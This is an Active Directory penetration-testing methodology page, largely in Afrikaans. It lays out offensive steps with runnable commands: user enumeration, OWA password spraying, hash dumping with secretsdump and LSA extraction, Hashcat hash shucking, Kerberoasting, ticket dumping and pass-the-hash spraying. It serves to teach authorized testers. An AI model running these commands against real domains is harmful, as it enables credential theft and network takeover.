# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as 'n fundamentele tegnologie wat **netwerkadministrateurs** in staat stel om doeltreffend **domains**, **users**, en **objects** binne 'n netwerk te skep en te bestuur. Dit is ontwerp om te skaal, en maak dit moontlik om 'n groot aantal gebruikers in hanteerbare **groups** en **subgroups** te organiseer, terwyl **access rights** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domains**, **trees**, en **forests**. 'n **Domain** bevat 'n versameling objects, soos **users** of **devices**, wat 'n gemeenskaplike databasis deel. **Trees** is groepe van hierdie domains wat deur 'n gedeelde struktuur verbind is, en 'n **forest** verteenwoordig die versameling van verskeie trees, gekoppel deur **trust relationships**, wat die hoogste vlak van die organisasie-struktuur vorm. Spesifieke **access** en **communication rights** kan op elkeen van hierdie vlakke aangewys word.

Sleutelkonsepte binne **Active Directory** sluit in:

1. **Directory** – Huisves alle inligting wat betrekking het op Active Directory objects.
2. **Object** – Verwys na entiteite binne die directory, insluitend **users**, **groups**, of **shared folders**.
3. **Domain** – Dien as 'n houer vir directory objects; verskeie domains kan binne 'n **forest** bestaan, elk met hul eie versameling objects.
4. **Tree** – 'n Groepering van domains wat 'n gemeenskaplike root domain deel.
5. **Forest** – Die hoogste vlak van organisatoriese struktuur in Active Directory, saamgestel uit verskeie trees met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** sluit 'n reeks dienste in wat kritiek is vir die gesentraliseerde bestuur en kommunikasie binne 'n netwerk. Hierdie dienste sluit in:

1. **Domain Services** – Gesentraliseerde data-stoor en bestuur van interaksies tussen **users** en **domains**, insluitend **authentication** en **search** funksionaliteit.
2. **Certificate Services** – Beheer die skep, verspreiding, en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-enabled toepassings deur die **LDAP protocol**.
4. **Directory Federation Services** – Verskaf **single-sign-on** vermoëns om users oor verskeie web toepassings in een sessie te verifieer.
5. **Rights Management** – Help om kopiereg-materiaal te beskerm deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS Service** – Krities vir die resolusie van **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Spiekbriefie

Jy kan baie by [https://wadcoms.github.io/](https://wadcoms.github.io) kry om vinnig te sien watter opdragte jy kan gebruik om 'n AD te enumere/ekspluateer.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

As jy net toegang het tot 'n AD-omgewing maar geen credentials/sessies nie, kan jy:

- **Pentest the network:**
- Scan die netwerk, vind masjiene en oop poorte en probeer **exploit vulnerabilities** of **extract credentials** daaruit (byvoorbeeld, [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS-enumerasie kan inligting gee oor sleutelbedieners in die domain soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die Algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check for null and Guest access on smb services** (dit sal nie op moderne Windows weergawes werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 'n Meer gedetailleerde gids oor hoe om 'n SMB-bediener te enumere kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 'n Meer gedetailleerde gids oor hoe om LDAP te enumere kan hier gevind word (let **spesiale aandag op anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Versamel credentials deur [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Benader 'n host deur [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials deur **fake UPnP services with evil-S** te **expose** ([**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856))
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Onttrek gebruikersname/evendele van interne dokumente, sosiale media, dienste (veral web) binne die domain omgewings en ook van publiek beskikbare bronne.
- As jy die volledige name van maatskappy werknemers kry, kan jy verskillende AD **username conventions** probeer (**read this**). Die mees algemene konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters van elke naam), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Kyk die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) bladsye.
- **Kerbrute enum**: Wanneer 'n **invalid username is requested** sal die bediener reageer met die **Kerberos error** kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons toelaat om te bepaal dat die gebruikersnaam ongeldig was. **Geldige gebruikersname** sal 'n **TGT in 'n AS-REP** reaksie of die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_ veroorzaak, wat aandui dat die gebruiker vereis word om pre-authentication uit te voer.
- **No Authentication against MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon) koppelvlak op domain controllers. Die metode roep die `DsrGetDcNameEx2` funksie na binding van die MS-NRPC koppelvlak om te kyk of die user of computer bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implementeer hierdie tipe enumerasie. Die navorsing kan hier gevind word: [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie bedieners in die netwerk gevind het, kan jy ook **user enumeration against it** uitvoer. Byvoorbeeld, jy kan die hulpmiddel [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lyste van usernames vind in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tog behoort jy die **name van die mense working on the company** te hê van die recon stap wat jy voorheen moes uitgevoer het. Met die name en surname kan jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om potensiële geldige usernames te genereer.

### Om een of verskeie usernames te ken

Ok, so jy weet jy het reeds 'n geldige username maar geen passwords... Probeer dan:

- [**ASREPRoast**](asreproast.md): As 'n user **nie** die attribuut _DONT_REQ_PREAUTH_ het nie kan jy **request a AS_REP message** vir daardie user wat sekere data sal bevat wat deur 'n afleiding van die password van die user versleuteld is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die mees **common passwords** met elk van die ontdekte users — dalk gebruik 'n user 'n slegte password (hou die password policy in gedagte!).
- Neem ook kennis dat jy ook kan **spray OWA servers** om te probeer toegang te kry tot die users mail servers.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy mag dalk in staat wees om sommige **obtain** challenge **hashes** te kry om te crack deur die **poisoning** van sekere protokolle van die **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

As jy daarin geslaag het om die active directory te enumereer sal jy **more emails and a better understanding of the network** hê. Jy mag in staat wees om NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) af te dwing om toegang tot die AD env te kry.

### NetExec workspace-driven recon & relay posture checks

- Gebruik **`nxcdb` workspaces** om AD recon state per engagement te bewaar: `workspace create <name>` skep per-protokol SQLite DBs onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Skakel views met `proto smb|mssql|winrm` en lys gathered secrets met `creds`. Vee sensitiewe data handmatig uit wanneer klaar: `rm -rf ~/.nxc/workspaces/<name>`.
- Vinnige subnet-ontdekking met **`netexec smb <cidr>`** toon **domain**, **OS build**, **SMB signing requirements**, en **Null Auth**. Members wat `(signing:False)` toon is **relay-prone**, terwyl DCs dikwels signing vereis.
- Genereer **hostnames in /etc/hosts** reguit vanaf NetExec output om teikenwerk te vergemaklik:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay na die DC geblokkeer** is deur signing, ondersoek steeds die **LDAP**-houding: `netexec ldap <dc>` beklemtoon `(signing:None)` / swak channel binding. 'n DC wat SMB signing vereis maar LDAP signing gedeaktiveer het, bly 'n lewensvatbare **relay-to-LDAP** teiken vir misbruik soos **SPN-less RBCD**.

### Kliëntkant drukker credential leaks → bulk domain credential validation

- Printer/web UIs soms **embed masked admin passwords in HTML**. Deur die source/devtools te kyk kan dit cleartext openbaar (bv. `<input value="<password>">`), wat Basic-auth toegang tot scan/print repositories moontlik maak.
- Opgehaalde afdruktake kan **plaintext onboarding docs** bevat met per-user passwords. Hou pairings gesinkroniseer wanneer jy toets:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steel NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT-hash wat jy reeds in besit het as 'n kandidaat-wagwoord vir ander, stadiger formate wie se sleutelmateriaal direk uit die NT-hash afgelei word. In plaas daarvan om lang passfrases te brute-forse in Kerberos RC4-tickets, NetNTLM-uitdagings of cached credentials, voer jy die NT-hashes in Hashcat se NT-candidate modes en laat dit wagwoordhergebruik valideer sonder ooit die platteks te leer. Dit is veral kragtig na 'n domeinkompromie waar jy duisende huidige en historiese NT-hashes kan oes.

Gebruik shucking wanneer:

- Jy het 'n NT-korpus van DCSync, SAM/SECURITY dumps, of credential vaults en moet toets vir hergebruik in ander domeine/foreste.
- Jy kap RC4-gebaseerde Kerberos materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, of DCC/DCC2 blobs.
- Jy wil vinnig hergebruik bewys vir lang, onontblusbare passfrases en onmiddellik pivot via Pass-the-Hash.

Die tegniek **werk nie** teen enkripsietipes wie se sleutels nie die NT-hash is nie (bv. Kerberos etype 17/18 AES). As 'n domein slegs AES afdwing, moet jy terugval op die gewone wagwoordmodusse.

#### Building an NT hash corpus

- **DCSync/NTDS** – Gebruik `secretsdump.py` met history om die grootste moontlike stel NT-hashes (en hul vorige waardes) te kry:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-inskrywings verbreed die kandidaatpoel dramaties omdat Microsoft tot 24 vorige hashes per rekening kan stoor. Vir meer maniere om NTDS-sekrete te oes sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) ekstraheer plaaslike SAM/SECURITY data en cached domain logons (DCC/DCC2). De-dupliceer en voeg daardie hashes by dieselfde `nt_candidates.txt` lys.
- **Hou metadata by** – Hou die gebruikersnaam/domein wat elke hash geproduseer het (selfs as die woordlys slegs hex bevat). Gekoppelde hashes vertel jou onmiddellik watter prinsipe 'n wagwoord hergebruik sodra Hashcat die wenkandidaat druk.
- Verkies kandidate van dieselfde forest of 'n vertroude forest; dit maksimeer die kans op oorvleueling wanneer jy shuck.

#### Hashcat NT-candidate modes

| Hash Tipe                                | Wagwoordmodus | NT-kandidaatmodus |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **moet rou 32-hex NT-hashes bly**. Deaktiveer rule engines (geen `-r`, geen hybrid modes) omdat mangling die kandidaat sleutelmateriaal korrupteer.
- Hierdie modes is nie inherente vinniger nie, maar die NTLM sleutelruimte (~30,000 MH/s op 'n M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om 'n gekoördineerde NT-lys te toets is baie goedkoper as om die hele wagwoordruimte in die stadiger formaat te verken.
- Hardloop altyd die **nuutste Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) omdat modes 31500/31600/35300/35400 onlangs gestuur is.
- Daar is tans geen NT-modus vir AS-REQ Pre-Auth nie, en AES etypes (19600/19700) benodig die platteks omdat hul sleutels via PBKDF2 uit UTF-16LE wagwoorde afgelei word, nie uit rou NT-hashes nie.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriveer die RC4 sleutel van elke NT-kandidaat en valideer die `$krb5tgs$23$...` blob. 'n Wedstryd bevestig dat die service-account een van jou bestaande NT-hashes gebruik.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Jy kan opsioneel later die platteks herstel met `hashcat -m 1000 <matched_hash> wordlists/` indien nodig.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 'n Suksesvolle wedstryd lewer die NT-hash wat reeds in jou lys bekend is, wat bewys dat die cached gebruiker 'n wagwoord hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in die vinnige NTLM-modus om die string te herstel.

Dieselfde werkvloei is van toepassing op NetNTLM challenge-responses (`-m 27000/27100`) en DCC (`-m 31500`). Sodra 'n wedstryd geïdentifiseer is kan jy relay, SMB/WMI/WinRM PtH lanceer, of die NT-hash her-kraak met masks/rules offline.

## Enumerating Active Directory WITH credentials/session

Vir hierdie fase moet jy die **kredensiële of 'n sessie van 'n geldige domeinrekening gekompromitteer** hê. As jy sommige geldige kredensiële of 'n shell as 'n domeingebruiker het, **moet jy onthou dat die opsies wat voorheen gegee is steeds opsies is om ander gebruikers te kompromitteer**.

Voordat jy die geauthentiseerde enumerasie begin, moet jy weet wat die **Kerberos double hop problem** is.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerasie

Om 'n rekening te kompromiteer is 'n **groot stap om die hele domein te kompromitteer**, omdat jy in staat sal wees om die **Active Directory Enumerasie** te begin:

Rakende [**ASREPRoast**](asreproast.md) kan jy nou elke moontlike kwesbare gebruiker vind, en rakende [**Password Spraying**](password-spraying.md) kan jy 'n **lys van al die gebruikersname** kry en die wagwoord van die gekompromiteerde rekening probeer, leë wagwoorde en nuwe belowende wagwoorde.

- Jy kan die [**CMD om 'n basiese recon uit te voer**](../basic-cmd-for-pentesters.md#domain-info) gebruik
- Jy kan ook [**powershell vir recon**](../basic-powershell-for-pentesters/index.html) gebruik wat meer stealth sal wees
- Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
- Nog 'n fantastiese hulpmiddel vir recon in 'n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy** nie (afhangend van die versamelingmetodes wat jy gebruik), maar **as dit jou nie omgee nie**, moet jy dit beslis probeer. Vind waar gebruikers kan RDP, vind paaie na ander groepe, ens.
- **Ander geoutomatiseerde AD-enumerasie-instrumente is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) aangesien dit interessante inligting kan bevat.
- 'n **Tool met GUI** wat jy kan gebruik om die directory te enumereer is **AdExplorer.exe** uit die **SysInternal** Suite.
- Jy kan ook in die LDAP-databasis soek met **ldapsearch** om te kyk vir kredensiële in velde _userPassword_ & _unixUserPassword_, of selfs in _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander metodes.
- As jy **Linux** gebruik, kan jy ook die domein enumereer met [**pywerview**](https://github.com/the-useless-one/pywerview).
- Jy kan ook geoutomatiseerde gereedskap probeer soos:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Uittrekking van alle domeingebruikers**

Dit is baie maklik om al die domein-gebruikersname van Windows te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumerasie-afdeling klein is, is dit die belangrikste deel van die geheel. Gaan die skakels na (veral dié van cmd, powershell, powerview en BloodHound), leer hoe om 'n domein te enumereer en oefen totdat jy gemaklik voel. Gedurende 'n assessering sal dit die sleutel oomblik wees om jou pad na DA te vind of om te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die verkryging van **TGS tickets** wat deur dienste wat aan gebruikersrekeninge gekoppel is gebruik word en die kraking van hul enkripsie — wat op gebruikerswagwoorde gebaseer is — **offline**.

Meer hieroor in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sodra jy sommige kredensiële verkry het, kan jy kyk of jy toegang tot enige **masjien** het. Hiervoor kan jy **CrackMapExec** gebruik om te probeer skakel op verskeie bedieners met verskillende protokolle, ooreenkomstig jou poort-skanderings.

### Lokale bevoegdheidsverhoging

As jy gekompromitteerde kredensiële of 'n sessie as 'n gewone domeingebruiker het en jy het **toegang** met hierdie gebruiker tot **enige masjien in die domein**, moet jy probeer om plaaslike bevoegdhede te verhoog en te soek na kredensiële. Dit is omdat slegs met plaaslike administrateurregte jy in staat sal wees om **hashes van ander gebruikers** in geheue (LSASS) en plaaslik (SAM) te dump.

Daar is 'n volledige bladsy in hierdie boek oor [**lokale privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en 'n [**kontrolelys**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Huidige Sessie-Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige gebruiker sal vind wat **jou toestemming gee om toegang te verkry** tot onverwagte hulpbronne, maar jy kan dit nagaan:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

As jy daarin geslaag het om die active directory te enumereer, sal jy **meer e-posadresse en 'n beter begrip van die netwerk** hê. Jy mag in staat wees om NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Soek vir Creds in Computer Shares | SMB Shares

Nou dat jy 'n paar basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word** kan **vind**. Jy kan dit handmatig doen, maar dit is 'n baie vervelige herhalende taak (veral as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om te leer oor gereedskap wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

As jy toegang tot ander PCs of shares het, kan jy **lêers plaas** (soos 'n SCF file) wat, as dit op een of ander manier geopen word, 'n **NTLM authentication teen jou sal trigger** sodat jy die **NTLM challenge** kan steel om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geauthentiseerde gebruiker in staat gestel om die **domain controller** te kompromitteer.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Vir die volgende tegnieke is 'n gewone domain user nie genoeg nie — jy benodig spesiale privileges/credentials om hierdie aanvalle uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om 'n **local admin** rekening te kompromitteer deur gebruik te maak van [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in geheue en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te bekom.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van 'n gebruiker het**, kan jy dit gebruik om hom te **impersonate**.\
Jy moet 'n **tool** gebruik wat die **NTLM authentication met** daardie **hash** sal **perform**, **of** jy kan 'n nuwe **sessionlogon** skep en daardie **hash** binne **LSASS** **inject**, sodat wanneer enige **NTLM authentication** uitgevoer word, daardie **hash** gebruik sal word. Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie aanval poog om die **user NTLM hash te gebruik om Kerberos tickets aan te vra**, as 'n alternatief vir die algemene Pass The Hash oor NTLM-protokol. Daarom kan dit veral **nuttig wees in netwerke waar die NTLM-protokol gedeaktiveer is** en slegs **Kerberos as authentication protocol toegelaat word**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)** aanvalsmethodiek steel aanvallers 'n gebruiker se authentication ticket in plaas van hul wagwoord of hashwaardes. Hierdie gesteelde ticket word dan gebruik om die gebruiker te **impersonate**, en sodoende ongemagtigde toegang tot hulpbronne en dienste binne 'n netwerk te verkry.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **password** van 'n **local administrator** het, moet jy probeer om daarmee **lokaal op** ander **PCs** aan te meld.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let wel dat dit redelik **luidrugtig** is en **LAPS** dit sal **verminder**.

### MSSQL Abuse & Trusted Links

Indien 'n gebruiker voorregte het om **toegang tot MSSQL-instanse** te kry, kan hy dit moontlik gebruik om **kommando's uit te voer** op die MSSQL-gasheer (as dit as SA loop), **steel** die NetNTLM **hash** of selfs 'n **relay attack** uit te voer.\
Ook, as 'n MSSQL-instansie deur 'n ander MSSQL-instansie vertrou word (database link). Indien die gebruiker voorregte oor die vertroude databasis het, sal hy in staat wees om **die trust relationship te gebruik om ook navrae in die ander instansie uit te voer**. Hierdie trusts kan geketting word en op 'n stadium kan die gebruiker 'n verkeerd gekonfigureerde databasis vind waar hy kommando's kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Misbruik van IT-asset/implementeringsplatforms

Derdeparty-inventaris- en implementeringssuite openbaar dikwels kragtige paaie na credentials en code execution. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Indien jy enige Computer-object met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) vind en jy het domeinvoorregte op die rekenaar, sal jy TGTs uit die geheue van alle gebruikers wat op daardie rekenaar aanmeld, kan dump.\
Dus, as 'n **Domain Admin op die rekenaar aanmeld**, sal jy sy TGT kan dump en hom kan naboots met behulp van [Pass the Ticket](pass-the-ticket.md).\
Danksy constrained delegation kan jy selfs **outomaties 'n Print Server kompromitteer** (hopelik sal dit 'n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Indien 'n gebruiker of rekenaar vir "Constrained Delegation" toegelaat word, sal dit in staat wees om **enige gebruiker te nadoen om toegang tot sekere dienste op 'n rekenaar te kry**.\
Indien jy dan die **hash kompromitteer** van hierdie gebruiker/rekenaar, sal jy in staat wees om **enige gebruiker te nadoen** (selfs domain admins) om toegang tot sekere dienste te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Om **WRITE**-privilege op 'n Active Directory-objek van 'n afgeleë rekenaar te hê, maak dit moontlik om code execution met **verhoogde voorregte** te bereik:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Die gekompromitteerde gebruiker kan sekere **interessante voorregte oor sekere domeinobjekte** hê wat jou kan toelaat om lateraal te beweeg en/of voorregte te verhoog.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Om 'n **Spool-diens wat luister** binne die domein te ontdek kan misbruik word om **nuwe credentials te bekom** en **voorregte te verhoog**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

As **ander gebruikers** toegang tot die **gekompromitteerde** masjien kry, is dit moontlik om **credentials uit die geheue te versamel** en selfs **beacons in hul prosesse in te spuit** om hulle te nadoen.\
Gewoonlik sal gebruikers via RDP toegang tot die stelsel kry, so hier is hoe om 'n paar aanvalle oor derdeparty-RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied 'n stelsel vir die bestuur van die **lokale Administrator-wagwoord** op domein-aangeslote rekenaars, wat verseker dat dit **ge-randomiseer**, uniek en gereeld **verander** word. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs slegs aan gemagtigde gebruikers beheer. Met voldoende permissies om hierdie wagwoorde te lees, word pivoting na ander rekenaars moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** van die gekompromitteerde masjien kan 'n manier wees om voorregte binne die omgewing te verhoog:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

